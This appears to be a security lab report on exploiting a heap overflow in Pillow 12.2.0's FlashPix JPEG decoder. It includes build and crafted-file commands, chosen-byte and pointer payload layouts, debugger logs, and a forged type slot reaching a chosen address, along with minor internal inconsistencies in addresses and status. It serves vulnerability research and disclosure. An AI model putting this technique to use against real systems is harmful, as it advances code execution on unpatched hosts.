# Pillow FPX scanline write — real-path consumer check (W1, 2026-11-21)

**Status: rung 4 CHOSEN BYTES AT CHOSEN OFFSETS, LIVE GLIBC HEAP METADATA
CORRUPTION AND A DETERMINISTIC PROCESS ABORT are now observed in a real
Python + Pillow 12.2.0 process, via a real OLE2/FlashPix file and libjpeg.
W1 observed an in-library AddressSanitizer `heap-buffer-overflow` WRITE with a
stack from `null_convert` through `jpeg_read_scanlines` to pinned
`JpegDecode.c:252`. W2 adds a plain non-ASan build where the chosen `0x5a`
overwrites the next malloc chunk's size field and two live heap chunks, then
5/5 runs end in SIGSEGV inside `PyGC_Collect()` at Python finalization, with
`MALLOC_CHECK_=3` reporting `corrupted double-linked list`. W3 identifies one
crossed chunk as a live CPython `PyUnicodeObject` and observes its `ob_type`
pointer field replaced by the coefficient-chosen byte pattern. W4 shows the
raw scanline can carry DISTINCT chosen bytes at distinct offsets, places a
chosen VALID pointer (`&PyCode_Type`, `0xa2d260`) in that live object's
`ob_type`, and isolates it causally: restoring every other overwritten byte
leaves `LOAD_OK`/exit 0, while restoring all but that one pointer field gives
a deterministic SIGSEGV in `Py_FinalizeEx()`. W5 goes one step further under
explicit lab conditions: the OOB write's chosen value is itself the address of
a forged `PyTypeObject` staged in the overwritten span, and a gdb-invoked
`_Py_Dealloc` reaches a chosen static marker address through its `tp_dealloc`
slot, with a negative control that does not. The call is gdb-invoked in a
non-PIE build at a deterministic brk address; no injected code, PC write,
autonomous trigger or ASLR-free execution was observed and those stay UNKNOWN.
This extends the frontier harness result in `reports/frontier-pillow2shell.md`. Witness replay
#898/#900 returned ESTABLISHED AS CLAIMED at the W1 labeled grade; the
witness's own rebuild matched the stores and the fixed-build control.
Author/operator replays are not independent acceptance. W3 (#926) and W4 were
replayed by the witness in W74 (#947) from its own pinned builds, all
ESTABLISHED AS CLAIMED at the labeled grade; W4 remains a type-confusion
fault, not chosen-code execution.**

## Repro (loopback-free local process; no network probe)

Everything durable is under `lab/pillow2shell/`. The volatile build tree was
`/tmp/pw2-w1/`; the two Pillow sdists came from PyPI as provisioning only.

1. Build both tags with ASan (rc 0 for each):
   `CFLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1" LDFLAGS="-fsanitize=address" python3 -m pip install --no-binary :all: --no-deps --target /tmp/pw2-w1/v12 /tmp/pw2-dl/pillow-12.2.0.tar.gz`
   (same for `v13` / `13.0.0`). `nm -D PIL/_imaging*.so | grep -c asan` = 74
   (v12) / 76 (v13).
2. Craft a real OLE2 file: `python3 make_case.py case.fpx 256 0x5a 16 16`
   (also `case5a.fpx 256 0xa5 16 16`, `case64.fpx 256 0xa5 64 64`).
   The generator copies Pillow 12.2.0's real
   `Tests/images/input_bw_five_bands.fpx` and uses `olefile.write_stream` to
   replace three equal-size streams in place:
   - `\005Image Contents`: a minimal property set with width/height and a
     12-byte-plus-4 `VT_BLOB` of `bands=2`, colors
     `(0x00018000, 0x00017FFE)` -> `MODES` gives `("RGBA","LA")`;
   - `Subimage 0000 Header`: one tile, `xtile=ytile=width=height`,
     `compression=2`, `internal_color_conversion=1`, `jpeg_tables=0` ->
     `jpegmode=None` -> the `JCS_UNKNOWN` fallback at pinned
     `JpegDecode.c:220-221`;
   - `Subimage 0000 Data`: a 4-component CMYK JPEG, 256 px wide, quality 100,
     flat coefficient fill `0xa5` which decodes to exactly `0x5a`; JPEG starts
     at stream offset 56 (`tile offset 28 + 28`, matching the sample).
   The embedded JPEG's 4 x 256 = 1024-byte row is written into a tile buffer
   sized 2 bytes/pixel x 16 or 64 pixels = 32 or 128 bytes.
3. Open and load, with the ASan runtime preloaded because the host `python3`
   is not ASan-linked:
   `PYTHONPATH=/tmp/pw2-w1/v12 LD_PRELOAD=$(gcc -print-file-name=libasan.so) ASAN_OPTIONS=detect_leaks=0 python3 -c 'from PIL import Image; im=Image.open("case64.fpx"); im.load()'`
4. Observe the actual store with a hardware watchpoint, because the host
   `libjpeg.so.8` is not ASan-instrumented:
   `LD_PRELOAD=<libasan.so> PYTHONPATH=<v12> gdb -q -batch -x observe200.gdb --args python3 -c '...'`

## Observed bytes and frames

- `Image.open()` succeeds in both builds:
  `open (64, 64) RGBA LA`, tile
  `_Tile(codec_name='jpeg', extents=(0, 0, 64, 64), offset=56, args=('LA', None))`
  (`lab/pillow2shell/load_v12.log`).
- Real decoder geometry, observed by interposing `jpeg_read_scanlines` in the
  live v12 process:
  `[JPEG-TRACE] output_width=256 output_components=4 jpeg_color_space=0
  out_color_space=0 scale=1/1 max_lines=1`, called from
  `ImagingJpegDecode src/libImaging/JpegDecode.c:252`. `0` is `JCS_UNKNOWN`.
  (The interposer's `dlsym(RTLD_NEXT)` failed after printing this line, so that
  one run aborted; the printed geometry precedes the failure and is not used
  as the corruption detector.)
- v12 `load()` returns `LOAD OK (90, 90, 90, 90)` — `0x5a` is the chosen
  decoded byte — with **no ASan report**: ASan cannot see the uninstrumented
  libjpeg stores.
- 16x16 tile (`gdb_watch32.log`): at `ImagingJpegDecode` entry
  `buffer=0x50300001f120 bytes=32 xsize=16 ysize=16`. Watch
  `buffer + 32` (first past-end byte) ->
  `Old value = 0 '\000'`, `New value = 90 'Z'`,
  frame `0x... in ?? () from /lib/x86_64-linux-gnu/libjpeg.so.8`.
- 64x64 tile (`gdb_watch200.log`): entry
  `buffer=0x50c0000007c0 bytes=128 xsize=64 ysize=64`. Watch
  `buffer + 200` (72 bytes past the allocation) -> same `0x00 -> 90 'Z'` in
  `libjpeg.so.8`; `x/16bx buffer+200` reads back `0x5a` at the watched byte.
- Fixed `13.0.0` on the byte-identical `case64.fpx`
  (`lab/pillow2shell/load_v13.log`): `open (64, 64) RGBA LA` succeeds, then
  `OSError: broken data stream when reading image file` — the decoder guard
  at fixed `JpegDecode.c:247-253` rejects `output_width (256) > state->xsize
  (64)` before the scanline. 13.0.0 also adds a front-end guard rejecting
  tiles other than 64x64, which is why the first 16x16 case was rejected at
  open time; the 64x64 case isolates the decoder guard.

## In-library ASan report (instrumented libjpeg-turbo)

To remove the "ASan cannot see libjpeg" limitation, libjpeg-turbo 2.1.5.1
was fetched as provisioning, built from source with `WITH_SIMD=0` and
`-fsanitize=address -fno-omit-frame-pointer -g -O1`, and both Pillow tags were
rebuilt with `JPEG_ROOT=/tmp/pw2-w1/jpegasan` pointing at that prefix. The
built `_imaging.so` has no RUNPATH, so bare `ldd` can resolve the system
`libjpeg.so.62` despite `JPEG_ROOT`. Verify with
`LD_LIBRARY_PATH=/tmp/pw2-w1/jpegasan/lib ldd PIL/_imaging*.so` and use the
same export at run time:
`LD_LIBRARY_PATH=/tmp/pw2-w1/jpegasan/lib PYTHONPATH=/tmp/pw2-w1/v12ja LD_PRELOAD=$(gcc -print-file-name=libasan.so) ASAN_OPTIONS=detect_leaks=0 python3 -c 'from PIL import Image; Image.open("case64.fpx").load()'`.
The witness hit the same loader gap on its independent rebuild and used the
analogous `/tmp/w73-pw2/jpegasan/lib` export. On the byte-identical `case64.fpx`:

- v12 (`lab/pillow2shell/asan_libjpeg_v12.log`):
  `ERROR: AddressSanitizer: heap-buffer-overflow`, `WRITE of size 1` at
  `0x50c000000840`, reported as `0 bytes after 128-byte region
  [0x50c0000007c0,0x50c000000840)`, allocated by `calloc` at
  `_setimage src/decode.c:226`. Stack:
  `null_convert jdcolor.c:391` -> `sep_upsample jdsample.c:98` ->
  `process_data_simple_main jdmainct.c:313` -> `jpeg_read_scanlines
  jdapistd.c:298` -> `ImagingJpegDecode src/libImaging/JpegDecode.c:252` ->
  `_decode src/decode.c:132`. The reported address equals the gdb watchpoint
  buffer start `0x50c0000007c0` plus its 128-byte size — both detectors see
  the same allocation boundary.
- v13 built the same way (`lab/pillow2shell/asan_libjpeg_v13_fixed.log`):
  `open (64, 64) RGBA` succeeds, `.load()` fails with
  `OSError: broken data stream when reading image file`, **no ASan report**.

Build commands and full logs are in `lab/pillow2shell/`. This is not the host
libjpeg byte-for-byte (2.1.5.1 rebuilt here vs the host 2.1.5 runtime); it is
an ASan-instrumented build of the same upstream version family, used only to
make the store visible. The earlier uninstrumented-host run and the gdb
watchpoints are preserved as the independent observations.

## W2 — real glibc heap metadata corruption and deterministic abort (2026-11-21)

W1's gdb watchpoint buffer was a `0x50c...` ASan-heap address: its past-end
neighbour is an ASan redzone (`fa` in the shadow at
`asan_libjpeg_v12.log:46`), so that build cannot answer whether a live object
is reached. A PLAIN non-ASan Pillow 12.2.0 was built from the same pinned
sdist with pip build isolation and no sanitizer flags
(`/tmp/pw2-w2/v12plain`, build record `lab/pillow2shell/build12_plain.log`);
its `_imaging` links the host `/lib/x86_64-linux-gnu/libjpeg.so.8` and its
`calloc` at `_setimage src/decode.c:226` comes from glibc.

On the byte-identical `case64.fpx`, under gdb (`glibc_raw_layout_v12.log`):
`python3.12` is non-PIE (text at `0x400000`), brk heap `[0xbab000,0xdbf000)`,
buffer at `0xd7d8a0`, chunk header `0x91` (144-byte chunk, 136 usable).
`glibc_first_store_v12.log` catches the first past-end store with a hardware
watchpoint: `Old 0x00 -> New 90 'Z'` at `buffer+128` from `libjpeg.so.8`,
stack `jpeg_read_scanlines` -> `ImagingJpegDecode src/libImaging/JpegDecode.c:252`
-> `_decode src/decode.c:132`. At that instant the next chunk is live: user
`= buffer+144`, size field `0x21`, first words `0x0000000000c990d0` (brk heap)
and `0x00007ffff7e04b30` (libc rw data).

By the time a watchpoint at `buffer+200` fires (`glibc_metadata_overwrite_v12.log`):
the next chunk's **size field is `0x5a5a5a5a5a5a5a5a`**, its first 48 user bytes
are all `0x5a`, and the tile region `buffer+120 .. +167` is all `0x5a`. The
overrun crosses two live chunks (`glibc_live_chunks_v12.log`): a 32-byte chunk
at `buffer+144` and a 992-byte chunk at `buffer+176`, reaching 80 bytes into
the latter's user data. This is live heap data, not allocator slack.

Observable consequence, no debugger attached: five consecutive plain-build
runs each print `OK (90, 90, 90, 90)` and then exit with rc 139 (SIGSEGV);
`MALLOC_CHECK_=3` exits rc 134 with glibc `corrupted double-linked list`
(`glibc_malloc_check_v12.log`). The crash backtrace
(`glibc_crashbt_v12.log`) is `#0 0x61cb5a` -> `#2 PyGC_Collect()` ->
`#3 Py_FinalizeEx()` -> `Py_RunMain`. Control: a plain 13.0.0 build on the
same file opens, then `.load()` raises `OSError: broken data stream when
reading image file` and exits rc 1 without a crash
(`plain_v13_fixed_control.log`).

## W3 — chosen bytes overwrite a live CPython object's type pointer (2026-11-21)

The W2 plain build is deterministic enough under gdb that the 128-byte tile
buffer lands at a known brk address. At `ImagingJpegDecode` entry
(`JpegDecode.c:132`, `lab/pillow2shell/glibc_pyobject_type_v12.log`):
`buffer=0xd32bb0`, `bytes=128`. The 992-byte chunk at `buffer+176` holds a
live CPython string object: its first words are `ob_refcnt=2` and
`ob_type=0xa472c0`, and gdb resolves `&PyUnicode_Type = 0xa472c0`
(`&PyCode_Type` is `0xa2d260`, so this is not a code object in this layout).

A hardware watchpoint on the last byte of that `ob_type` word
(`buffer+191`) fires with `Old value = 0 '\000'`, `New value = 90 'Z'` from
`libjpeg.so.8`, stack `jpeg_read_scanlines` -> `ImagingJpegDecode
src/libImaging/JpegDecode.c:252`. After the row:
`x/4gx buffer+176` reads `0x5a5a5a5a5a5a5a5a5a` for both `ob_refcnt` and
`ob_type`. So the chosen decoded byte reaches and replaces a live Python
object's pointer-typed field, not just allocator metadata. The value is the
repeated chosen byte `0x5a`, **not an attacker-chosen valid address**: no
valid-pointer value, dereference of the corrupted object, PC or control-flow
diversion, or execution was observed. Do not upgrade the rung-4 label on this
basis.

A separate LD_PRELOAD allocator trace (`lab/pillow2shell/glibc_pyobject_alloc_stack.log`,
layout shifted by the interposer) shows the same class of neighbour can be an
interpreter object: the chunk immediately after the 128-byte tile `calloc`
was a 920-byte `PyObject_Malloc` from `_PyObject_NewVar` / `_PyCode_New`.
That trace is supporting only; the `PyUnicode_Type` identification above is
the direct observation in the unmodified plain run.


## W4 — distinct chosen bytes, chosen valid pointer, isolated fault (2026-11-21)

W1-W3 used one uniform decoded byte (`0x5a`). `make_case.py` now takes an
optional 6th argument (256 bytes as 512 hex chars = the desired raw scanline
pattern) and an optional 7th (JPEG height). The encoder writes sample value
`0xff - desired` per component; `rawscan.c` and a gdb read at the return of
`jpeg_read_scanlines` confirm libjpeg emits the desired bytes exactly with
quality 100, `subsampling=0`, `optimize=True`. `case_ptr64.fpx` (SHA-256
`cf7787a35747ae88b65f22cf8187f8e7012812f9739cd7985d00365dd15c3bc6`, 64-row
JPEG, 3188-byte embedded stream) carries `0x11` at row offsets 128-135 (first
past-end bytes), `0x5a` elsewhere except the little-endian valid address
`60 d2 a2 00 00 00 00 00` (`0xa2d260`) at 184-191 (the object's `ob_type`).
`firstrow.log` shows distinct chosen bytes in the real scanline. The
uniform-fill invocation is unchanged: regenerating `case64.fpx` still gives
`0b258df0b41064a975aed808b32866157ffb7cc60bfe29e8a1c00db9902fa9c0`.

In the plain v12.2.0 build, the 128-byte tile buffer is again at `0xd32bb0`
and the following 992-byte chunk at `+176` is a live `PyUnicodeObject`
(`ob_refcnt=2`, `ob_type=&PyUnicode_Type=0xa472c0`, resolved by gdb). A hardware
watchpoint on `buffer+184` fires
`Old value = 192 '\300'`, `New value = 96 '`'` at
`0x00007ffff7333f98` in `libjpeg.so.8`, stack `jpeg_read_scanlines` ->
`ImagingJpegDecode src/libImaging/JpegDecode.c:252`. In the earlier 8-row case
`case_ptr.fpx` (`pattern2.hex`), whose pattern also sets `0x33` at 176-183 and
`0x44` at 192-199, the post-row readback is `ob_refcnt=0x3333333333333333`,
`ob_type=0xa2d260`, following word `0x4444444444444444`.

Causal isolation used the same byte-identical `case_ptr64.fpx` in three gdb
runs. After the first decoder call, the full 896-byte past-end span
(`buffer+128 .. buffer+1024`) was snapshotted before the write and restored
afterwards:

- `full64_restore_clean.log` — full restore, no other edit: prints `LOAD_OK`,
  inferior exits normally.
- `full64_restore_type.log` — same restore, then only `*(unsigned long
  *)(buffer+184) = 0xa2d260` re-applied: prints `LOAD_OK`, then SIGSEGV at
  `0x447239`, stack through `Py_FinalizeEx()`. `crash_disasm.log` shows the
  fault at a read from a pointer held in a finalizer object; no attacker-chosen
  code address is executed. This isolates the chosen pointer value as the
  sole difference between clean exit and fault.
- Negative control preserved: restoring only the 24-byte object header, or
  only the first 256 past-end bytes, still crashed at `0x61d988` because the
  remaining overwritten span was still corrupt (`restore_all.log`,
  `restore_type.log`, `full_restore_clean.log` in the volatile tree; the
  conclusion is that a partial restore is not a control).

A second valid-pointer differential pins the mechanism. `case_long.fpx`
(SHA-256 `be85c9a647b43318547591d35fc60310befe2505b08d6fb1728512eb6331c05f`,
`pattern_long.hex`) is decoded byte-for-byte identical to `case_ptr64.fpx`
except bytes 184-191: `20 bf a3 00 00 00 00 00` = `0xa3bf20`
(`&PyLong_Type`, a non-GC type) instead of `0xa2d260`
(`&PyCode_Type`, a GC-tracked type). `full_restore_long.gdb` performs the same
full-span snapshot/restore and re-applies only that field:
`full64_restore_long.log` prints `LOAD_OK` and exits normally. Under identical
isolation the GC-tracked chosen type faults. This is consistent with the
chosen type's GC flag changing how finalization traverses an object that was
originally allocated as non-GC; that mechanism is an INFERENCE, the
differential and the fault are observed. It remains a type-confusion fault,
not a call to attacker-chosen code.

Without a debugger, 5/5 plain v12.2.0 runs of `case_ptr64.fpx` print
`LOAD_OK`, then exit rc 134 with `corrupted size vs. prev_size`
(`run64_[1-5].log`). Plain fixed 13.0.0 on the same file raises
`OSError: broken data stream when reading image file`, rc 1
(`plain_v13_pattern_control.log`). No socket, server, external probe or
chosen-code marker was used. The label stays type-confusion fault, NOT
pointer-to-code execution, PC control or a valid-chosen-pointer dereference
to attacker-chosen code.

## W5 — forged type slot reached from the OOB-written pointer (2026-11-21)

W4 left one gap: a chosen valid pointer landed in a live object's `ob_type`,
but the resulting fault was a type-confusion crash, not a call to a chosen
address. W5 closes that gap under explicit, honestly labeled laboratory
conditions.

`pattern_fake.hex` is `pattern_full.hex` with bytes 184-191 changed from
`60 d2 a2 00 00 00 00 00` (`&PyCode_Type`) to `90 2f d3 00 00 00 00 00`
(`0xd32f90`). `case_fake.fpx` (SHA-256
`6c59dd01bc9c8a77e7d84d77b8ef8b79f77d2b3ef7678b880604098f80ffedea`) is
generated with the same pinned `make_case.py` invocation as W4. In the plain
non-PIE v12.2.0 gdb session the tile buffer again lands at `0xd32d90`, so
`buffer+512 = 0xd32f90` is inside the OOB-reachable span and is the address
the image itself writes into `ob_type`:
`forged_type_self.log` prints `AFTER_DECODE type=d32f90 fake=d32f90`.

The script snapshots the past-end span in two pieces, deliberately excluding
the 8 `ob_type` bytes, so the OOB-written pointer survives while the rest of
the heap is restored. It then stages a 416-byte copy of the real
`PyUnicode_Type` at that address (measured with the system Python 3.12
headers: `sizeof(PyTypeObject)=416`, `tp_dealloc` at offset 48) and changes
only the copy's `tp_dealloc` to `0x45e6e6` (`_PyObject_Dump`, a known static
address in the non-PIE binary). The log records
`OBTYPE_FROM_OOB=d32f90 forged_slot=45e6e6 MATCH=1`. Calling
`_Py_Dealloc` on the live object at `buffer+176` then transfers to the chosen
address: `Breakpoint 2, 0x000000000045e6e6 in _PyObject_Dump ()`.

The causal control is byte-for-byte identical except that `tp_dealloc` is
left at the copied real value (`0x5a8450`):
`forged_type_control.log` prints `CONTROL ... tp_dealloc=5a8450`, does **not**
hit the marker breakpoint, and instead faults in `PyObject_Free()`. An
earlier variant that set `ob_type` with gdb rather than taking the OOB value
(`forged_type_call.log`) also reached the marker; the self-supplied run is the
stronger one and is the claim.

**Label for W5:** chosen indirect call **target** reached through a forged
type slot whose pointer came from the image's OOB write, with an observed
transfer to a chosen static address and a matching negative control. NOT
autonomous exploitation: the `_Py_Dealloc` call is invoked from gdb, the
fake type is staged by gdb inside the overwritten span, the binary is non-PIE
and the `0xd32f90` address is a deterministic brk address with no disclosed
ASLR leak. No injected code, ROP chain, PC write, natural trigger, socket or
external probe was demonstrated. Grade stays ◐.

## Evidence-ladder disposition

- Rung 1 (primitive identified): ESTABLISHED (source + advisory pins).
- Rung 2 (deterministic trigger): ESTABLISHED (real FPX file, two builds).
- Rung 3 (confirmed memory corruption): ESTABLISHED twice independently —
  a gdb hardware watchpoint on a real libjpeg store past a live heap
  allocation in a real Pillow process, and an in-library ASan
  `heap-buffer-overflow` WRITE with a stack through `jpeg_read_scanlines` to
  pinned `JpegDecode.c:252`.
- Rung 4 (demonstrated security impact): **CHOSEN BYTES AT CHOSEN OFFSETS IN
  THE LIVE PROCESS, WITH LIVE GLIBC HEAP METADATA CORRUPTION, A DETERMINISTIC
  PROCESS ABORT, AND A CHOSEN VALID POINTER VALUE IN A LIVE OBJECT'S TYPE
  FIELD WHOSE ISOLATED PRESENCE CAUSES A DETERMINISTIC FAULT**. W1: +32 and
  +200 past 32- and 128-byte tile buffers, byte value chosen through JPEG
  coefficients (`0xa5` in -> `0x5a` out). W2: next malloc chunk size field
  `0x21 -> 0x5a5a5a5a5a5a5a5a`, two live chunks overwritten, 5/5 SIGSEGV in
  `PyGC_Collect()` at finalization, glibc `corrupted double-linked list` under
  `MALLOC_CHECK_=3`. W3: the coefficient-chosen `0x5a` replaces `ob_refcnt`
  and `ob_type` of a live `PyUnicodeObject` at `buffer+176`. W4: distinct
  chosen bytes at distinct offsets, chosen valid `0xa2d260` in `ob_type`
  written from `libjpeg.so.8` at pinned `JpegDecode.c:252`, and a causal
  differential (all other bytes restored -> clean exit; only the pointer
  re-applied -> SIGSEGV in `Py_FinalizeEx()`). Not demonstrated: execution
  of chosen code, a benign marker, PC or arbitrary control-flow diversion,
  or the advisory's non-PIE `system@plt` chain. Do not upgrade the label
  beyond this.

## Boundaries and open work

All work was local; no socket, server, external probe or other plant was
touched. The real FPX front end, OLE2 parser, Pillow build, Python process and
host libjpeg are now all exercised. W2 resolved the W1 open question: the
bytes reach live glibc heap chunks and their metadata, not only slack, and
the corrupted heap deterministically aborts the process. W3 identified the
crossed chunk at `buffer+176` as a live CPython `PyUnicodeObject`; W4 put a
chosen valid pointer in its `ob_type` and isolated that one field as the
cause of a fault when every other overwritten byte is restored. Still
UNKNOWN: which object owns the 32-byte chunk at `buffer+144`; a chosen
adjacent `bytes` object; whether a *forged* type object with attacker-chosen
function pointers can be placed at a known address and called (no address
disclosure was observed); PC control, chosen-code execution or the advisory's
ASLR-disabled non-PIE `system@plt` chain. Witness replay of W1 (#898/#900)
returned ESTABLISHED AS CLAIMED at the report's labeled rung-4 grade; W3
(#926) and W4 were replayed in W74 (#947) from the witness's own pinned
builds and also returned ESTABLISHED AS CLAIMED at the labeled grade, with
W4 explicitly a type-confusion fault and the grade unchanged.
